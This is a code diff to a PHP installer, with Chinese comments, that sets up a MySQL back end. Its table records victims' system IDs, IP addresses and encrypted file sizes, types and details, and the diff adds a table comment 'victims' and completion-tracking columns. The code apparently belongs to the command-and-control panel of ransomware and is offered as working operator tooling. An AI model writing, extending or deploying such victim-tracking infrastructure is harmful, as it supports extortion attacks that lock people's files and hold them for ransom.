@@ -29,7 +29,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
             // 白名单验证DB名，防止SQL注入
             if (!preg_match('/^[a-zA-Z0-9_]+$/', $name)) {
-                $error = '数据库名只能包含字母、数字、下划线'; break;
+                throw new RuntimeException('数据库名只能包含字母、数字、下划线');
             }
             $pdo->exec("CREATE DATABASE IF NOT EXISTS `{$name}` DEFAULT CHARACTER SET utf8mb4");
             $pdo->exec("USE `{$name}`");
@@ -54,9 +54,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 `encrypted_size` bigint NOT NULL DEFAULT 0,
                 `encrypted_types` text DEFAULT NULL,
                 `encrypted_detail` text DEFAULT NULL,
+                `total_count` int NOT NULL DEFAULT 0,
+                `total_size` bigint NOT NULL DEFAULT 0,
+                `is_complete` tinyint(1) NOT NULL DEFAULT 1,
+                `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                 `created_at` timestamp DEFAULT CURRENT_TIMESTAMP,
                 INDEX(`systemid`), INDEX(`ip`)
-            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='victims'");
             // 写.env
             $env = "DB_HOST={$host}\nDB_PORT={$port}\nDB_NAME={$name}\nDB_USER={$user}\nDB_PASS={$pass}\nHANDSHAKE_SECRET={$secret}\n";
             file_put_contents(__DIR__ . '/.env', $env);
@@ -65,6 +69,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             exit;
         } catch (PDOException $e) {
             $error = '数据库连接失败: ' . $e->getMessage();
+        } catch (RuntimeException $e) {
+            $error = $e->getMessage();
         }
     }
     elseif ($step === 3) {
